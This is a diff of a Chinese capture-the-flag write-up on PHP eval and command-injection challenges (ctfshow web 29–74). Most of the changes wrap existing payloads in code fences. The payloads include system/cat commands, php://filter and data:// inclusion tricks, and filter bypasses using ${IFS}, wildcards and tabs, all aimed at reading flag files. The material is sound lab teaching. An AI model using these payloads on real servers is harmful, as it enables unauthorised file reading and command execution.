@@ -42,7 +42,11 @@ if(isset($_GET['c'])){
     [abcd]	匹配abcd中任何一个字符
     [a-z]	表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0
 
+```
 PAYLOAD:c=system('cat f*');
+```
+
+
 
 
 
@@ -52,11 +56,17 @@ PAYLOAD:c=system('cat f*');
 了解 eval函数之后
 
 传入
+
+```
 c=echo "npfs";?>ctf <?php system('ls');
+```
+
 可以看到有 flag.php文件,之后采用include进行包含读取
 payload：
 
+```
 ?c=echo "npfs"; ?>ctf <?php include($_GET['url']);&url=php://filter/read=convert.base64-encode/resource=flag.php
+```
 
 
 
@@ -94,11 +104,18 @@ pcntl_exec()
 这里采用反引号绕过
 
 解法一：
+
+```
 payload：c=echo \`cat f*`;
+```
 
 解法二：
-payload：
+
+```payload：
 ?c=echo "npfs "; include($_GET['url']); ?>&url=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+
 
 
 
@@ -154,11 +171,13 @@ file -f:报错出具体内容
 
 
 解法一：
+```
 payload: c=echo(`tac%09f*`);
-
+```
 解法二：
+```
 c=include($_GET["url"]);?>&url=php://filter/read=convert.base64-encode/resource=flag.php
-
+```
 直接单引号改双引号即可
 
 
@@ -191,15 +210,15 @@ emmmmm,过滤了括号
 这里直接用include 进行无括号包含即可
 
 解法一：
+```
 payload：?c=include $_GET["npfs"] ?>&npfs=php://filter/read=convert.base64-encode/resource=flag.php
-
+```
 解法二：
 payload：
-
+```
 ?c=include $_POST[npfs] ?>
  npfs=php://filter/read=convert.base64-encode/resource=flag.php
-
-
+```
 
 ## web 33
 
@@ -221,12 +240,14 @@ if(isset($_GET['c'])){
 过滤了单双引号，直接用数组作为参数即可绕过
 
 解法一：
+```
 ?c=include $_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
-
+```
 解法二：
+```
 ?c=include $_POST[1]?>
 1=php://filter/read=convert.base64-encode/resource=flag.php
-
+```
 
 
 ## web 34
@@ -297,12 +318,14 @@ if(isset($_GET['c'])){
 直接把数字1改成字符就🆗了
 
 payload:
+```
 ?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
-
+```
 payload:
+```
 ?c=include$_POST[a]?>
 a=php://filter/read=convert.base64-encode/resource=flag.php
-
+```
 
 
 ## web 37
@@ -336,8 +359,9 @@ data://，可以让用户来控制输入流，当它与包含函数结合时，�
 flag.php 可以用通配符绕过
 
 payload:
+```
 ?c=data://text/plain,<?php system("cat fl*") ?>
-
+```
 查看源码即可得到flag
 
 ## web 38
@@ -365,8 +389,9 @@ if(isset($_GET['c'])){
 原理同上一题，多了个php过滤，base64编码绕过即可
 
 payload：
+```
 ?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTs=
-
+```
 ## web 39
 
 ```php
@@ -412,9 +437,9 @@ if(isset($_GET['c'])){
 看来上面这篇文章应该可以知道scandir(current(localeconv())) 查看当前目录所有文件名
 
 我们可以发现flag.php在数组的倒数第二个值里，我们可以通过 array_reverse 进行逆转数组，然后用next()函数进行下一个值的读取，记得成功读取flag.php文件
-
+```
 payload:?c=highlight_flie(next(array_reverse(scandir(current(localeconv())))));
-
+```
 ## web 41
 
 ```php
@@ -502,11 +527,10 @@ if(isset($_GET['c'])){
 &	//两条命令都会执行
 &&	//两条命令都会执行
 ```
-
+```
 payload：cat flag.php;
 payload:   cat flag.php||
-
-
+```
 
 ## web 43
 
@@ -541,9 +565,9 @@ file -f:报错出具体内容
 grep
 strings
 ```
-
+```
 payload: sort flag.php||      （payload有很多，这里只列举一个）
-
+```
 查看源码即可得到flag
 
 
@@ -564,10 +588,9 @@ if(isset($_GET['c'])){
 ```
 
 多过滤了一个flag,通配符绕过即可
-
+```
 payload:?c=sort%20fl*||      (payload有很多，这里只列举一个）
-
-
+```
 
 ## web 45
 
@@ -597,9 +620,9 @@ if(isset($_GET['c'])){
  `%20`
  `%09
  ```
-
+```
 payload： ?c=sort${IFS}fl*|| 
-
+```
 
 
 ## web 46
@@ -618,9 +641,9 @@ if(isset($_GET['c'])){
 ```
 
 过滤了数子，$，*等，通配符可以使用？问号，空格可用%09  （不属于数字）
-
+```
 payload: ?c=sort%09fl?g.php||
-
+```
 
 
 ## web 47
@@ -639,9 +662,9 @@ if(isset($_GET['c'])){
 ```
 
 多过滤了一些内容，自己按照表找出未被过滤的进行替代即可
-
+```
 payload: ?c=tac%09fl?g.php||
-
+```
 ## web 48
 
 ```
@@ -694,9 +717,9 @@ if(isset($_GET['c'])){
 ```
 
 <>和?一起使用时没有回显,所以这里的？可以用反斜杠进行代替
-
+```
 paylaod:?c=tac<>fla\g.php||
-
+```
 
 
 ## web 51
@@ -715,9 +738,9 @@ if(isset($_GET['c'])){
 ```
 
 %0a是换行，同样可以进行命令分隔；tac被过滤，换nl
-
+```
 payload: ?c=nl<>fla\g.php%0a
-
+```
 
 
 ## web 52
@@ -734,9 +757,9 @@ if(isset($_GET['c'])){
     highlight_file(__FILE__);
 }
 ```
-
+```
 ?c=nl${IFS}fla\g.php%0a
-
+```
 得到
 
 ![](http://img.npfs06.top/20210225161238.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
@@ -775,9 +798,9 @@ if(isset($_GET['c'])){
 ```
 
 更简单了，不需要命令分隔了......
-
+```
 payload:?c=nl${IFS}fla\g.php
-
+```
 
 
 ## web 54
@@ -825,10 +848,10 @@ if(isset($_GET['c'])){
     highlight_file(__FILE__);
 }
 ```
-
+```
 先放payload: ?c=/???/????64%20????.???
+```
 
-  
 
 **bin目录:** 
 
@@ -845,9 +868,9 @@ base64解密，即可得到flag
 
 
 看了羽大佬的WP还有一种解法
-
+```
 如下：payload：?c=/???/???/????2 ????.???      ---》 然后在url + /flag.php.bz2
-
+```
 
 
 **/usr/bin目录:**
@@ -985,9 +1008,13 @@ if(isset($_POST['c'])){
 
 payload:
 
+```
 c=echo highlight_file('flag.php');
 c=show_source("flag.php");
 c=highlight_file("flag.php");  
+```
+
+
 
 
 
@@ -1018,17 +1045,17 @@ payload：c=highlight_file("/flag.txt");
 ## web 67
 
 emmmm.  print_r被禁了，换成 var_dump即可，做法同上
-
+```
 payload：c=var_dump(scandir("/"));highlight_file("/flag.txt");
 
-
+```
 
 ## web 68-70
 
 文件显示的代码，比如show_source、highlight_file、file_get_contents等基本都被禁了，这里换成文件包含的即可，如include、require
-
+```
 payload: c=var_dump(scandir("/"));include("/flag.txt");
-
+```
 
 
 ## web 71
@@ -1056,9 +1083,9 @@ if(isset($_POST['c'])){
  ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。
 
 可以利用exit9);停止后面的程序
-
+```
 payload：c=require("/flag.txt");exit();
-
+```
 
 
 ## web 72
@@ -1323,9 +1350,9 @@ exit(0);
 
 
 可以发现里面有个flagc.txt文件
-
+```
 payload:  c=include("/flagc.txt");exit();
-
+```
 
 
 ## web 74
